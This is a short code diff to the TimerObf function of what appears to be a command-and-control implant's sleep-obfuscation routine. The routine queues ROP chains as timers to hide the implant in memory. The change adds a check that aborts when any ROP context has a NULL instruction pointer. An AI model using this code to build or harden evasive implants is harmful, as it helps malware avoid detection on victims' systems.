@@ -571,6 +571,16 @@ BOOL TimerObf(
 
                     PRINTF( "Rops to be executed: %d\n", Inc )
 
+                    /* if the jmp gadget lookup failed we fell back to
+                     * SLEEPOBF_BYPASS_NONE. never queue a context with a
+                     * NULL Rip, fall back to the default sleep instead */
+                    for ( int i = 0; i < Inc; i++ ) {
+                        if ( ! Rop[ i ].Rip ) {
+                            PUTS( "ROP chain contains a NULL Rip, aborting" )
+                            goto LEAVE;
+                        }
+                    }
+
                     /* execute/queue the timers */
                     for ( int i = 0; i < Inc; i++ ) {
                         if ( Method == SLEEPOBF_EKKO ) {
